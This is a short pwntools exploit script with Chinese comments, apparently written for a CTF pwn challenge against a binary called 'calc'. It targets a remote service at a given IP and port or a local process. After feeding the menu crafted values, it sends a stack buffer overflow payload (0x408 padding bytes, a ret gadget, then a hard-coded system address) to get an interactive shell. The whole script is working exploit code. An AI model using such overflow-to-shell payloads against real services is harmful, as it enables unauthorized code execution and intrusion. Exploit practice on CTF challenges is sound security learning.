from kk import*
context.binary = elf = ELF('./calc')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('120.26.60.25',20281)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p)

    # ================= 你的利用代码写这里 =================
    system = 0x4017BE
    ret  = 0x401874

    p.recvuntil(b"Best Calculator")
    p.sendlineafter(b"> ", b"1")         
    p.sendlineafter(b"> ", b"10.0")       
    p.sendlineafter(b"> ", b"-0") 

    p.recvuntil(b"Best Calculator")
    p.sendlineafter(b"> ", b"1337")

    p.recvuntil(b"Create note")
    payload = b'a'*(0x400+8) + p64(ret) + p64(system)
    p.send(payload)
    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()